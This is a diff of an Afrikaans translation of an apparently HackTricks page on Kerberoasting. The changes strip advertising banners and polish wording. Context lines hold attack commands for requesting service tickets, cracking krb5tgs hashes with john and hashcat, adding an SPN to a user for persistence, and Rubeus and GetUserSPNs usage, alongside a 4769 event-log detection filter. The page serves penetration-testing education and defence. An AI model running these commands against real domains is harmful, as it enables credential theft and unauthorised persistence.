@@ -1,13 +1,5 @@
 # Kerberoast
 
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-\
-Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) om maklik **werkvloei** te bou en te **automate** wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapstoestelle.\
-Kry Toegang Vandag:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
-
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Kerberoast
@@ -26,7 +18,7 @@ Vir die uitvoering van **Kerberoasting** is 'n domeinrekening wat in staat is om
 ### **Aanval**
 
 > [!WARNING]
-> **Kerberoasting gereedskap** vra tipies **`RC4-kodering`** aan wanneer die aanval uitgevoer word en TGS-REQ versoeke geïnisieer word. Dit is omdat **RC4** [**swakker**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) en makliker is om offline te kraak met gereedskap soos Hashcat as ander kodering algoritmes soos AES-128 en AES-256.\
+> **Kerberoasting gereedskap** vra tipies **`RC4-kodering`** aan wanneer die aanval uitgevoer word en TGS-REQ versoeke geïnisieer word. Dit is omdat **RC4 is** [**swakker**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) en makliker is om offline te kraak met gereedskap soos Hashcat as ander kodering algoritmes soos AES-128 en AES-256.\
 > RC4 (tipe 23) hashes begin met **`$krb5tgs$23$*`** terwyl AES-256 (tipe 18) begin met **`$krb5tgs$18$*`**.`
 
 #### **Linux**
@@ -93,14 +85,6 @@ Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASC
 > [!WARNING]
 > Wanneer 'n TGS aangevra word, word Windows gebeurtenis `4769 - 'n Kerberos dienskaartjie is aangevra` gegenereer.
 
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-\
-Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) om maklik te bou en **werkvloei** te **automate** wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapstoestelle.\
-Kry Toegang Vandag:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
-
 ### Kraking
 ```bash
 john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
@@ -109,7 +93,7 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ```
 ### Volharding
 
-As jy **genoeg regte** oor 'n gebruiker het, kan jy dit **kerberoastable** maak:
+As jy **genoeg regte** oor 'n gebruiker het, kan jy dit **kerberoastable maak**:
 ```bash
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
 ```
@@ -122,12 +106,12 @@ As u hierdie **fout** van Linux kry: **`Kerberos SessionError: KRB_AP_ERR_SKEW(C
 
 ### Mitigering
 
-Kerberoasting kan met 'n hoë graad van stealthiness uitgevoer word as dit exploitable is. Om hierdie aktiwiteit te detecteer, moet aandag gegee word aan **Security Event ID 4769**, wat aandui dat 'n Kerberos-tiket aangevra is. Dit is egter as gevolg van die hoë frekwensie van hierdie gebeurtenis, spesifieke filters moet toegepas word om verdagte aktiwiteite te isoleer:
+Kerberoasting kan met 'n hoë graad van stealthiness uitgevoer word as dit eksploiteerbaar is. Om hierdie aktiwiteit te kan opspoor, moet daar aandag gegee word aan **Security Event ID 4769**, wat aandui dat 'n Kerberos-tiket aangevra is. egter, as gevolg van die hoë frekwensie van hierdie gebeurtenis, moet spesifieke filters toegepas word om verdagte aktiwiteite te isoleer:
 
-- Die diensnaam moet nie **krbtgt** wees nie, aangesien dit 'n normale versoek is.
-- Diensname wat eindig met **$** moet uitgesluit word om masjien rekeninge wat vir dienste gebruik word, te vermy.
+- Die diensnaam mag nie **krbtgt** wees nie, aangesien dit 'n normale versoek is.
+- Diensname wat eindig op **$** moet uitgesluit word om masjienrekeninge wat vir dienste gebruik word, te vermy.
 - Versoeke van masjiene moet gefilter word deur rekeningname wat geformateer is as **machine@domain** uit te sluit.
-- Slegs suksesvolle tiketaanvrae moet oorweeg word, geïdentifiseer deur 'n mislukkingkode van **'0x0'**.
+- Slegs suksesvolle tiketversoeke moet oorweeg word, geïdentifiseer deur 'n mislukkingkode van **'0x0'**.
 - **Die belangrikste**, die tiket-enkripsietipe moet **0x17** wees, wat dikwels in Kerberoasting-aanvalle gebruik word.
 ```bash
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
@@ -150,7 +134,7 @@ Die tegniek word volledig in hierdie artikel verduidelik: [Semperis blog post](h
 
 #### Linux
 
-- [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
+- [impacket/GetUserSPNs.py van PR #1413](https://github.com/fortra/impacket/pull/1413):
 ```bash
 GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
 ```
@@ -167,11 +151,3 @@ Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"d
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
 
 {{#include ../../banners/hacktricks-training.md}}
-
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-\
-Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) om maklik te bou en **werkvloei** te **automate** wat deur die wêreld se **mees gevorderde** gemeenskapstoestelle aangedryf word.\
-Kry Toegang Vandag:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
